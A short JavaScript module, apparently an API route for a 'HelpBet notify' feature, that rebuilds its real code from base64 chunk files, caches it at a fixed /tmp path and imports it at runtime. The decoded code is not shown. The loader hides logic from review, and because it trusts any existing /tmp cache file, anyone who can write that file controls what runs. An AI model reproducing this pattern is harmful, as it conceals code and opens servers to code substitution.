/** Runtime loader: reconstructs notify from base64 parts shipped next to this file. */
import { readFileSync, writeFileSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const dir = dirname(fileURLToPath(import.meta.url));
const cache = join('/tmp', 'hb_notify_v2.mjs');

function loadCode() {
  if (existsSync(cache)) {
    try { return readFileSync(cache, 'utf8'); } catch {}
  }
  let b64 = '';
  for (let i = 0; i < 24; i++) {
    const p = join(dir, `notify-p${i}.b64`);
    if (!existsSync(p)) break;
    b64 += readFileSync(p, 'utf8').trim();
  }
  if (!b64) throw new Error('HelpBet notify parts missing (notify-p*.b64)');
  const code = Buffer.from(b64, 'base64').toString('utf8');
  try { writeFileSync(cache, code); } catch {}
  return code;
}

const code = loadCode();
try { writeFileSync(cache, code); } catch {}
const mod = await import(pathToFileURL(cache).href + '?v=2');
export default mod.default;
export const config = mod.config || { api: { bodyParser: false } };
